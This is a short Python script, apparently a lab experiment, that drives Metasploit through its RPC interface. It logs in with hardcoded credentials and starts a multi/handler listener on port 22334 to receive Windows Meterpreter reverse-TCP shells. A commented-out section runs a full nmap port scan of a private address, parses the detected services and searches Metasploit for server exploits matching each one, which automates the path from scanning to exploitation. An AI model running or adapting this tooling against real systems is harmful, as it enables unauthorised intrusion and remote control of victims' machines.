import time
import MsfMsgrpc
from msfrpc import Msfrpc

client = Msfrpc({})
res = client.login('test', 'test1234')
if res[b"result"] == b"success":
    print('connect success')
client.call('module.execute', ['exploit', 'multi/handler', {
    'LHOST': '0.0.0.0',
    'LPORT': 22334,
    'PAYLOAD': 'windows/meterpreter/reverse_tcp'
}])

# host = "192.168.159.145"
# port = 55553
# username = "test"
# password = "test1234"

# msf_msgrpc = MsfMsgrpc.Msgrpc(host, port, username, password)
# response = msf_msgrpc.login()
# if response[b"result"] == b"success":
#     print('connect success')

# token = response[b'token']

# response = msf_msgrpc.createConsole(token)

# consoleId = response[b"id"]
# print("create console",consoleId)

# response = msf_msgrpc.consoleWrite(token, consoleId, "nmap -p- 192.168.159.137\n")

# time_count = 0
# while True:
#     response = msf_msgrpc.consoleRead(token, consoleId)
#     if (time_count % 5) == 0:
#         print('Port scanning: 192.168.159.137 [Elapsed time: '+str(time_count)+' s]')
        
#     status = response.get(b'busy')
#     if status is False:
#         print('End')
#         break
#     time.sleep(1.0)
#     time_count += 1

# data = str(response[b"data"]).split('\\n')
# for port in data:
#     port_list = port.split(' ')
#     val_port = port_list[0].split('/')
#     if val_port[0].isnumeric():
#         if port_list[-1] != "unknown":
#             msfcmd = msf_msgrpc.consoleWrite(token, consoleId, "search name:" + port_list[-1] + " type:exploit app:server\n")
#             time.sleep(3)
#             response = msf_msgrpc.consoleRead(token, consoleId)
#             result = str(response[b"data"]).split('\\n')
#             for show in result:
#                 print(show)
